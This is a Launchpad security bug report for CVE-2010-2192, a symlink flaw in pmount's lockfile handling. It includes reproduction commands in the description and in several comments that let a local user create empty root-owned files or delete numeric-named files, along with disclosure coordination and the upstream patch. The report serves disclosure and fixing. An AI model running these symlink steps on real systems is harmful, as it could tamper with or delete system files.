@@ -1,0 +1,287 @@
+Bug #574809: Symlink attacks possible with pmount
+
+URL: https://bugs.launchpad.net/ubuntu/+source/pmount/+bug/574809
+
+Metadata: security_related=true; information_type=Public Security; tags=["patch", "patch-accepted-debian"]; targets=pmount (Ubuntu) (Won't Fix, Undecided), pmount (Ubuntu Lucid) (Fix Released, Undecided), pmount (Ubuntu Maverick) (Won't Fix, Undecided), pmount (Ubuntu Dapper) (Won't Fix, Undecided), pmount (Ubuntu Hardy) (Fix Released, Undecided), pmount (Ubuntu Jaunty) (Fix Released, Undecided), pmount (Ubuntu Karmic) (Fix Released, Undecided)
+
+Description:
+pmount makes use of /var/lock, which is world-writable with a sticky bit, for the creation of lockfiles.  For example, when I execute:
+
+$ pmount --lock /dev/sr0 1
+
+pmount creates a new directory at /var/lock/pmount_dev_sr0, and creates a file "1" in that folder (to represent a lockfile for pid 1).  On running with the --unlock flag, this file and directory are removed.  These operations are done as root, presumably so multiple instances of pmount run by different users do not conflict, and so users cannot remove pmount locks created by other users.
+
+If an unprivileged user creates this directory ahead of time, pmount won't complain (it may exist due to other previous lockfiles).  If that user places a symbolic link with a numeric name in the directory pointing to an arbitrary location, then pmount can be invoked to create an empty root-owned file at that location, with 0644 permissions.  You can reproduce as follows, assuming a pmount-able device at /dev/sr0:
+
+$ mkdir /var/lock/pmount_dev_sr0
+$ ln -s /etc/suid-debug /var/lock/pmount_dev_sr0/1
+$ pmount --lock /dev/sr0 1
+$ stat /etc/suid-debug
+
+Alternately, this issue can be abused to delete any file on disk that has a numeric name from 1-65536.  Simply create the empty directory, call pmount --lock with the desired file to delete, remove the directory with the new lockfile inside, replace the directory with a symlink to the parent directory of the file to be deleted, and call pmount --unlock.
+
+Discussion:
+Message 2 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+Dan, I can confirm this, but I don't see that pmount is altering the contents of the file if it already exists. Eg:
+$ cat /etc/foo
+test
+$ stat /etc/foo
+  File: `/etc/foo'
+  Size: 5         	Blocks: 8          IO Block: 4096   regular file
+Device: fb01h/64257d	Inode: 135724      Links: 1
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2010-06-05 12:07:30.580581903 +0000
+Modify: 2010-06-05 12:05:57.868006989 +0000
+Change: 2010-06-05 12:05:57.868006989 +0000
+
+$ mkdir /var/lock/pmount_dev_sr0
+$ ls -ld /var/lock/pmount_dev_sr0/
+drwxr-xr-x 2 jamie jamie 40 2010-06-05 12:12 /var/lock/pmount_dev_sr0/
+
+$ ln -s /etc/foo /var/lock/pmount_dev_sr0/1
+$ ls -l /var/lock/pmount_dev_sr0/1
+lrwxrwxrwx 1 jamie jamie 8 2010-06-05 12:13 /var/lock/pmount_dev_sr0/1 -> /etc/foo
+
+$ pmount --lock /dev/sr0 1
+
+$ cat /etc/foo
+test
+$ stat /etc/foo
+  File: `/etc/foo'
+  Size: 5         	Blocks: 8          IO Block: 4096   regular file
+Device: fb01h/64257d	Inode: 135724      Links: 1
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2010-06-05 12:07:30.580581903 +0000
+Modify: 2010-06-05 12:05:57.868006989 +0000
+Change: 2010-06-05 12:05:57.868006989 +0000
+
+I think I would characterize this as a 'Low' issue. A local attacker in the 'plugdev' group on Ubuntu could create things like /forcefsck or maybe fiddle with files in /var to DoS applications (eg, sockets, named pipes, etc).
+
+---
+Message 3 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+(and additionally your observation about removing arbitrary files with a numeric name).
+
+---
+Message 4 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+Dan, actually I can't reproduce the file delete on Lucid. I get:
+$ pmount --unlock /dev/sr0 1
+Error: do_unlock: could not remove lock directory: Not a directory
+$ ls -l /var/lock
+total 0
+drwxr-xr-x 2 root  root  40 2010-06-05 12:07 pmount
+lrwxrwxrwx 1 jamie jamie  4 2010-06-05 12:49 pmount_dev_sr0 -> /tmp
+
+What version were you testing?
+
+---
+Message 5 | Author: dan-j-rosenberg | Subject: Re: Symlink attacks possible with pmount
+I tested with pmount 0.9.20-2.
+
+You're correct that you can't alter existing files - only create new files and delete numeric-named files.  You can reproduce the deletion as follows:
+
+root@Dan:~# touch /etc/1
+root@Dan:~# stat /etc/1
+  File: `/etc/1'
+  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
+Device: 801h/2049d	Inode: 2936455     Links: 1
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2010-06-05 09:53:12.000000000 -0400
+Modify: 2010-06-05 09:53:12.000000000 -0400
+Change: 2010-06-05 09:53:12.000000000 -0400
+root@Dan:~# su drosenbe
+drosenbe@Dan:/root$ cd /var/lock/
+drosenbe@Dan:/var/lock$ mkdir pmount_dev_sr0
+drosenbe@Dan:/var/lock$ pmount --lock /dev/sr0 1
+drosenbe@Dan:/var/lock$ rm -rf pmount_dev_sr0/
+drosenbe@Dan:/var/lock$ ln -s /etc/ pmount_dev_sr0
+drosenbe@Dan:/var/lock$ pmount --unlock /dev/sr0 1
+Error: do_unlock: could not remove lock directory: Not a directory
+drosenbe@Dan:/var/lock$ stat /etc/1
+stat: cannot stat `/etc/1': No such file or directory
+
+I agree with the low severity of this issue - it's mostly just an annoyance.
+
+---
+Message 6 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+Oh heh, duh. That is exactly what I did and the file *is* gone. I saw the error and forgot to check the file. :)
+
+---
+Message 7 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+Email sent to Debian maintainer and vsec with a CRD of 2010-06-16.
+
+---
+Message 8 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+This is now public.
+
+---
+Message 9 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+This is CVE-2010-2192. Attached is the patch from upstream.
+
+From upstream:
+"The solution is very simple: put the locks in /var/lib/pmount-locks.
+As /var/lib is not world-writable, there is no risk of a user
+intercepting /var/lib/pmount-locks before pmount creates it. This is
+what the attached patch does, and the best thing is that there won't
+even be needs for postinst scripts with this solution."
+
+---
+Message 10 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+Since the package referred to in this bug is in universe for supported releases (it is in main in 6.06 LTS, but official desktop support for Dapper has ended), it is community maintained. If someone is able, I suggest posting a debdiff for this issue. When a debdiff is available, members of the security team will review it and publish the package. See the following link for more information: https://wiki.ubuntu.com/SecurityTeam/UpdateProcedures
+
+---
+Message 11 | Author: fourmond | Subject: Re: Symlink attacks possible with pmount
+Here is the debdiff I've used for upload to Debian stable security. Adapting to Ubuntu is just a matter of changing the changelog; patches should apply cleanly to all versions of pmount I know of.
+
+---
+Message 12 | Author: kees | Subject: Re: Symlink attacks possible with pmount
+Maverick is not vulnerable to this flaw due to the link protections in the kernel.
+
+---
+Message 13 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+Removing ubuntu-security-sponsors since there are not debdiffs available for processing.
+
+---
+Message 14 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+While pmount on Dapper is in main, it is no longer actively supported (Dapper desktop is EOL). Marking Won't Fix.
+
+---
+Message 15 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+Jaunty was fixed in 0.9.18-2+lenny1build0.9.04.1.
+
+---
+Message 16 | Author: jdstrand | Subject: Re: Symlink attacks possible with pmount
+Processed patch for hardy, karmic and lucid and uploaded to the ubuntu-security ppa.
+
+---
+Message 17 | Author: janitor | Subject: Re: Symlink attacks possible with pmount
+This bug was fixed in the package pmount - 0.9.20-2ubuntu0.1
+
+---------------
+pmount (0.9.20-2ubuntu0.1) lucid-security; urgency=low
+
+  * SECURITY UPDATE: 02-fix-CVE-2010-2192.dpatch to fix a security hole,
+    referenced as CVE-2010-2192. Patch thanks to Vincent Fourmond (Debian).
+    - LP: #574809
+ -- Jamie Strandboge <email address hidden>   Fri, 13 Aug 2010 13:58:47 -0500
+
+---
+Message 18 | Author: janitor | Subject: Re: Symlink attacks possible with pmount
+This bug was fixed in the package pmount - 0.9.19-1ubuntu0.1
+
+---------------
+pmount (0.9.19-1ubuntu0.1) karmic-security; urgency=low
+
+  * SECURITY UPDATE: 02-fix-CVE-2010-2192.dpatch to fix a security hole,
+    referenced as CVE-2010-2192. Patch thanks to Vincent Fourmond (Debian).
+    - LP: #574809
+ -- Jamie Strandboge <email address hidden>   Fri, 13 Aug 2010 13:57:54 -0500
+
+---
+Message 19 | Author: janitor | Subject: Re: Symlink attacks possible with pmount
+This bug was fixed in the package pmount - 0.9.16-4ubuntu0.1
+
+---------------
+pmount (0.9.16-4ubuntu0.1) hardy-security; urgency=low
+
+  * SECURITY UPDATE: 02-fix-CVE-2010-2192.dpatch to fix a security hole,
+    referenced as CVE-2010-2192. Patch thanks to Vincent Fourmond (Debian).
+    - LP: #574809
+ -- Jamie Strandboge <email address hidden>   Fri, 13 Aug 2010 13:55:17 -0500
+
+Relevant attachments:
+fix-pmount-var-lock-exploit-v2.diff:
+diff --git a/configure.ac b/configure.ac
+index 27998c8..fa8b5f5 100644
+--- a/configure.ac
++++ b/configure.ac
+@@ -29,9 +29,9 @@ AC_ARG_WITH(media-dir,
+ 	AC_DEFINE_UNQUOTED(MEDIADIR, "$withval", [directory for mounts]),
+ 	AC_DEFINE_UNQUOTED(MEDIADIR, "/media/", [directory for mounts]))
+ AC_ARG_WITH(lock-dir,
+-	AC_HELP_STRING([--with-lock-dir=DIR], [Directory for mount locks (default: /var/lock/pmount)]),
++	AC_HELP_STRING([--with-lock-dir=DIR], [Directory for mount locks (default: /var/lib/pmount-locks)]),
+ 	AC_DEFINE_UNQUOTED(LOCKDIR, "$withval", [directory for locks]),
+-	AC_DEFINE_UNQUOTED(LOCKDIR, "/var/lock/pmount", [directory for locks]))
++	AC_DEFINE_UNQUOTED(LOCKDIR, "/var/lib/pmount-locks", [directory for locks]))
+ AC_ARG_WITH(whitelist,
+ 	AC_HELP_STRING([--with-whitelist=PATH], [Path of whitelist configuration file (default: /etc/pmount.allow)]),
+ 	AC_DEFINE_UNQUOTED(WHITELIST, "$withval", [whitelist configuration file]),
+diff --git a/src/policy.c b/src/policy.c
+index 2629f3e..507e154 100644
+--- a/src/policy.c
++++ b/src/policy.c
+@@ -681,9 +681,13 @@ mntpt_mounted( const char* mntpt, int expect )
+ void make_lockdir_name( const char* device, char* name, size_t name_size )
+ {
+     char* devname;
++    /* Strip an initial whitespace in device, will look better */
++    if(*device == '/')
++      device++;
+
+     devname = strreplace( device, '/', '_' );
+-    snprintf( name, name_size, "%s%s", LOCKDIR, devname );
++    /* Make the lockdir a subdirectory of LOCKDIR ! */
++    snprintf( name, name_size, "%s/%s", LOCKDIR, devname );
+     free( devname );
+ }
+
+---
+Debdiff for debian stable -- easy to adapt:
+diff -u pmount-0.9.18/debian/changelog pmount-0.9.18/debian/changelog
+--- pmount-0.9.18/debian/changelog
++++ pmount-0.9.18/debian/changelog
+@@ -1,3 +1,10 @@
++pmount (0.9.18-2+lenny1) stable-security; urgency=high
++
++  * 02-fix-CVE-2010-2192.dpatch to fix a security hole, referenced as
++    CVE-2010-2192
++
++ -- Vincent Fourmond <fourmond@debian.org>  Tue, 15 Jun 2010 21:41:17 +0200
++
+ pmount (0.9.18-2) unstable; urgency=medium
+
+   * Adding Vcs-* fields
+diff -u pmount-0.9.18/debian/rules pmount-0.9.18/debian/rules
+--- pmount-0.9.18/debian/rules
++++ pmount-0.9.18/debian/rules
+@@ -3,6 +3,9 @@
+ include /usr/share/cdbs/1/class/autotools.mk
+ include /usr/share/cdbs/1/rules/dpatch.mk
+
++# Manually set the lock directory:
++DEB_CONFIGURE_EXTRA_FLAGS = --with-lock-dir=/var/lib/pmount-locks
+ common-post-build-arch::
+ 	# Generate a POT file
+ 	cd po; intltool-update -p --verbose
+diff -u pmount-0.9.18/debian/patches/00list pmount-0.9.18/debian/patches/00list
+--- pmount-0.9.18/debian/patches/00list
++++ pmount-0.9.18/debian/patches/00list
+@@ -1,0 +2 @@
++02-fix-CVE-2010-2192
+only in patch2:
+unchanged:
+--- pmount-0.9.18.orig/debian/patches/02-fix-CVE-2010-2192.dpatch
++++ pmount-0.9.18/debian/patches/02-fix-CVE-2010-2192.dpatch
+@@ -0,0 +1,24 @@
++#! /bin/sh /usr/share/dpatch/dpatch-run
++## 02-fix-CVE-2010-2192.dpatch by  <fourmond@debian.org>
++##
++## All lines beginning with `## DP:' are a description of the patch.
++## DP: No description.
++@DPATCH@
++diff -urNad '--exclude=CVS' '--exclude=.svn' '--exclude=.git' '--exclude=.arch' '--exclude=.hg' '--exclude=_darcs' '--exclude=.bzr' pmount~/src/policy.c pmount/src/policy.c
++--- pmount~/src/policy.c	2010-06-15 21:41:08.000000000 +0200
+++++ pmount/src/policy.c	2010-06-15 21:42:22.546025474 +0200
++@@ -559,9 +559,13 @@
++ void make_lockdir_name( const char* device, char* name, size_t name_size )
++ {
++     char* devname;
+++    /* Strip an initial whitespace in device, will look better */
+++    if(*device == '/')
+++      device++;
++     devname = strreplace( device, '/', '_' );
++-    snprintf( name, name_size, "%s%s", LOCKDIR, devname );
+++    /* Make the lockdir a subdirectory of LOCKDIR ! */
+++    snprintf( name, name_size, "%s/%s", LOCKDIR, devname );
++     free( devname );
++ }
